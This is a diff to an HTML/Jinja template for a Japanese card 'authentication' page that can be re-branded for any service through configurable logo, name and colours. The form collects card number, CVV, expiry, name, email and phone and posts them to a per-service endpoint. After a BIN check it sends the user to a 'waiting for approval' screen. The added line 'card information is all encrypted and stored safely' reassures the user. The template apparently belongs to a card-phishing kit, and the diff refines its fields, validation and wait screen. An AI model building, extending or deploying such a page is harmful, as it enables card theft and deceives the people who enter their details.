@@ -30,6 +30,21 @@
             width: 100%;
         }
 
+        /* スマホ対応：枠線を削除 */
+        @media (max-width: 768px) {
+            body {
+                padding: 0;
+                align-items: flex-start;
+            }
+
+            .container {
+                border: none;
+                padding: 20px;
+                max-width: 100%;
+                min-height: 100vh;
+            }
+        }
+
         .logo {
             text-align: center;
             margin-bottom: 30px;
@@ -42,10 +57,44 @@
 
         h1 {
             font-size: 28px;
-            margin-bottom: 30px;
+            margin-bottom: 15px;
             text-align: center;
             font-weight: bold;
             color: {{ service.design.text_color }};
+        }
+
+        .page-title {
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-align: center;
+            font-weight: 600;
+            color: {{ service.design.text_color }};
+        }
+
+        .page-description {
+            font-size: 14px;
+            margin-bottom: 30px;
+            text-align: center;
+            color: {{ service.design.text_color }};
+            opacity: 0.8;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 24px;
+                margin-bottom: 10px;
+            }
+
+            .page-title {
+                font-size: 20px;
+                margin-bottom: 8px;
+            }
+
+            .page-description {
+                font-size: 13px;
+                margin-bottom: 20px;
+            }
         }
 
         .form-group {
@@ -61,6 +110,13 @@
             flex: 1;
         }
 
+        @media (max-width: 768px) {
+            .form-row {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+
         label {
             display: block;
             margin-bottom: 8px;
@@ -69,7 +125,9 @@
             color: {{ service.design.text_color }};
         }
 
-        input[type="text"] {
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"] {
             width: 100%;
             padding: 12px;
             border: 2px solid {{ service.design.border_color }};
@@ -78,9 +136,45 @@
             color: {{ service.design.text_color }};
         }
 
-        input[type="text"]:focus {
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="tel"]:focus {
             outline: none;
             border-color: {{ service.design.primary_color }};
+        }
+
+        .agreement-box {
+            margin: 25px 0;
+            padding: 15px;
+            background-color: {{ service.design.secondary_color }};
+            border: 1px solid {{ service.design.border_color }};
+        }
+
+        .agreement-checkbox {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .agreement-checkbox input[type="checkbox"] {
+            margin-top: 4px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .agreement-text {
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .agreement-text a {
+            color: {{ service.design.primary_color }};
+            text-decoration: underline;
+        }
+
+        .agreement-text a:hover {
+            opacity: 0.8;
         }
 
         .btn {
@@ -93,10 +187,16 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
+            transition: opacity 0.3s;
         }
 
-        .btn:hover {
+        .btn:hover:not(:disabled) {
             opacity: 0.9;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
         .error-message {
@@ -113,12 +213,146 @@
             display: block;
         }
 
+        .optional-label {
+            font-size: 12px;
+            color: #666;
+            font-weight: normal;
+        }
+
+        /* ローディングオーバーレイ */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: {{ service.design.background_color }};
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loader {
+            width: 60px;
+            height: 60px;
+            position: relative;
+        }
+
+        .loader div {
+            position: absolute;
+            width: 6px;
+            height: 20px;
+            background-color: {{ service.design.primary_color }};
+            border-radius: 3px;
+            animation: loader-fade 1.2s linear infinite;
+        }
+
+        .loader div:nth-child(1) {
+            transform: rotate(0deg) translate(0, -28px);
+            animation-delay: 0s;
+        }
+
+        .loader div:nth-child(2) {
+            transform: rotate(30deg) translate(0, -28px);
+            animation-delay: -1.1s;
+        }
+
+        .loader div:nth-child(3) {
+            transform: rotate(60deg) translate(0, -28px);
+            animation-delay: -1s;
+        }
+
+        .loader div:nth-child(4) {
+            transform: rotate(90deg) translate(0, -28px);
+            animation-delay: -0.9s;
+        }
+
+        .loader div:nth-child(5) {
+            transform: rotate(120deg) translate(0, -28px);
+            animation-delay: -0.8s;
+        }
+
+        .loader div:nth-child(6) {
+            transform: rotate(150deg) translate(0, -28px);
+            animation-delay: -0.7s;
+        }
+
+        .loader div:nth-child(7) {
+            transform: rotate(180deg) translate(0, -28px);
+            animation-delay: -0.6s;
+        }
+
+        .loader div:nth-child(8) {
+            transform: rotate(210deg) translate(0, -28px);
+            animation-delay: -0.5s;
+        }
+
+        .loader div:nth-child(9) {
+            transform: rotate(240deg) translate(0, -28px);
+            animation-delay: -0.4s;
+        }
+
+        .loader div:nth-child(10) {
+            transform: rotate(270deg) translate(0, -28px);
+            animation-delay: -0.3s;
+        }
+
+        .loader div:nth-child(11) {
+            transform: rotate(300deg) translate(0, -28px);
+            animation-delay: -0.2s;
+        }
+
+        .loader div:nth-child(12) {
+            transform: rotate(330deg) translate(0, -28px);
+            animation-delay: -0.1s;
+        }
+
+        @keyframes loader-fade {
+            0%, 39%, 100% {
+                opacity: 0.3;
+            }
+            40% {
+                opacity: 1;
+            }
+        }
+
         /* カスタムCSS */
         {{ service.design.custom_css | safe }}
+
+        .security-note {
+            font-size: 12px;
+            color: {{ service.design.text_color }};
+            opacity: 0.75;
+            text-align: center;
+            margin-top: 6px;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- ローディングオーバーレイ -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+
+    <div class="container" id="mainContainer">
         {% if service.logo_url %}
         <div class="logo">
             <img src="{{ service.logo_url }}" alt="{{ service.name }}">
@@ -126,16 +360,24 @@
         {% endif %}
 
         <h1>{{ service.display_name }}</h1>
+
+        {% if service.title %}
+        <div class="page-title">{{ service.title }}</div>
+        {% endif %}
+
+        {% if service.description %}
+        <div class="page-description">{{ service.description }}</div>
+        {% endif %}
         
         <form id="cardForm">
             <div class="form-group">
-                <label for="card_number">カード番号</label>
+                <label for="card_number">カード番号（14〜16桁）</label>
                 <input type="text" id="card_number" name="card_number" maxlength="19" placeholder="1234 5678 9012 3456" required>
             </div>
             
             <div class="form-row">
                 <div class="form-group">
-                    <label for="expiry">有効期限</label>
+                    <label for="expiry">有効期限（MM/YY）</label>
                     <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 
@@ -146,36 +388,119 @@
             </div>
             
             <div class="form-group">
-                <label for="name">カード名義人</label>
+                <label for="name">カード名義人（ローマ字）</label>
                 <input type="text" id="name" name="name" placeholder="TARO YAMADA" required>
             </div>
-            
-            <button type="submit" class="btn">認証する</button>
+
+            <div class="form-group">
+                <label for="email">メールアドレス</label>
+                <input type="email" id="email" name="email" placeholder="example@example.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">電話番号 <span class="optional-label">（任意）</span></label>
+                <input type="tel" id="phone" name="phone" placeholder="09012345678">
+            </div>
+
+            <div class="agreement-box">
+                <div class="agreement-checkbox">
+                    <input type="checkbox" id="agreement" name="agreement">
+                    <label for="agreement" class="agreement-text">
+                        <a href="/termsofservice" target="_blank">利用規約</a>と<a href="/privacypolicy" target="_blank">プライバシーポリシー</a>に同意する
+                    </label>
+                </div>
+            </div>
+
+            <p class="security-note">カード情報は全て暗号化されて、安全に保存されます</p>
+            <button type="submit" class="btn" id="submitBtn" disabled>認証する</button>
+
         </form>
         
         <div id="error" class="error-message"></div>
     </div>
 
     <script>
-        // カード番号の自動フォーマット
-        document.getElementById('card_number').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s/g, '');
-            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-            e.target.value = formattedValue;
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const mainContainer = document.getElementById('mainContainer');
+        const submitBtn = document.getElementById('submitBtn');
+        const agreementCheckbox = document.getElementById('agreement');
+        const errorDiv = document.getElementById('error');
+
+        // URLパラメータからエラーメッセージを取得
+        const urlParams = new URLSearchParams(window.location.search);
+        const errorParam = urlParams.get('error');
+        
+        if (errorParam === 'rejected') {
+            errorDiv.textContent = 'カード情報または連絡先・登録情報が間違っています。';
+            errorDiv.style.display = 'block';
+        }
+
+        // 同意チェックボックスの状態でボタンを有効化/無効化
+        agreementCheckbox.addEventListener('change', function() {
+            validateForm();
         });
 
-        // 有効期限の自動フォーマット
+        // フォーム全体のバリデーション
+        function validateForm() {
+            const cardNumber = document.getElementById('card_number').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const agreed = agreementCheckbox.checked;
+
+            // すべての必須項目が入力され、同意されているか
+            if (cardNumber.length >= 14 && cardNumber.length <= 16 &&
+                /^\d{2}\/\d{2}$/.test(expiry) &&
+                cvv.length >= 3 && cvv.length <= 4 &&
+                name.length > 0 &&
+                email.length > 0 &&
+                agreed) {
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.disabled = true;
+            }
+        }
+
+        // カード番号の自動フォーマット（14-16桁のみ）
+        document.getElementById('card_number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+            
+            // 16桁まで
+            if (value.length > 16) {
+                value = value.slice(0, 16);
+            }
+            
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+            validateForm();
+        });
+
+        // 有効期限の自動フォーマット（年は25-34のみ）
         document.getElementById('expiry').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                const month = value.slice(0, 2);
+                const year = value.slice(2, 4);
+                value = month + (year ? '/' + year : '');
             }
             e.target.value = value;
+            validateForm();
         });
 
         // CVVは数字のみ
         document.getElementById('cvv').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
+            validateForm();
+        });
+
+        // 名義、メール、電話番号の入力監視
+        document.getElementById('name').addEventListener('input', validateForm);
+        document.getElementById('email').addEventListener('input', validateForm);
+
+        // 電話番号は数字とハイフンのみ
+        document.getElementById('phone').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^\d-]/g, '');
         });
 
         // フォーム送信
@@ -188,11 +513,18 @@
             const cardNumber = document.getElementById('card_number').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
-            const name = document.getElementById('name').value;
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
             
             // バリデーション
-            if (cardNumber.length < 13 || cardNumber.length > 19) {
-                errorDiv.textContent = 'カード番号が正しくありません';
+            if (cardNumber.length < 14 || cardNumber.length > 16) {
+                errorDiv.textContent = 'カード番号は14〜16桁で入力してください';
+                return;
+            }
+
+            if (!/^\d{14,16}$/.test(cardNumber)) {
+                errorDiv.textContent = 'カード番号は数字のみで入力してください';
                 return;
             }
             
@@ -200,11 +532,40 @@
                 errorDiv.textContent = '有効期限が正しくありません';
                 return;
             }
+
+            // 年の範囲チェック（25-34）
+            const year = parseInt(expiry.split('/')[1]);
+            if (year < 25 || year >= 35) {
+                errorDiv.textContent = '有効期限の年は25〜34の範囲で入力してください';
+                return;
+            }
+
+            // 月の範囲チェック（01-12）
+            const month = parseInt(expiry.split('/')[0]);
+            if (month < 1 || month > 12) {
+                errorDiv.textContent = '有効期限の月は01〜12の範囲で入力してください';
+                return;
+            }
             
             if (cvv.length < 3 || cvv.length > 4) {
                 errorDiv.textContent = 'CVVが正しくありません';
                 return;
             }
+
+            // メールアドレスの簡易チェック
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                errorDiv.textContent = 'メールアドレスが正しくありません';
+                return;
+            }
+
+            if (!agreementCheckbox.checked) {
+                errorDiv.textContent = '利用規約とプライバシーポリシーに同意してください';
+                return;
+            }
+            
+            // ローディング表示（フォームを非表示）
+            mainContainer.style.display = 'none';
+            loadingOverlay.classList.add('active');
             
             try {
                 const response = await fetch('/{{ service_key }}/submit_card', {
@@ -216,18 +577,26 @@
                         card_number: cardNumber,
                         expiry: expiry,
                         cvv: cvv,
-                        name: name
+                        name: name,
+                        email: email,
+                        phone: phone
                     })
                 });
                 
                 const result = await response.json();
                 
                 if (result.success) {
+                    // BINチェック成功 → 承認待ち画面へ
                     window.location.href = '/{{ service_key }}/waiting';
                 } else {
+                    // BINチェック失敗 → エラー表示してフォームを再表示
+                    loadingOverlay.classList.remove('active');
+                    mainContainer.style.display = 'block';
                     errorDiv.textContent = result.message;
                 }
             } catch (error) {
+                loadingOverlay.classList.remove('active');
+                mainContainer.style.display = 'block';
                 errorDiv.textContent = 'エラーが発生しました';
             }
         });
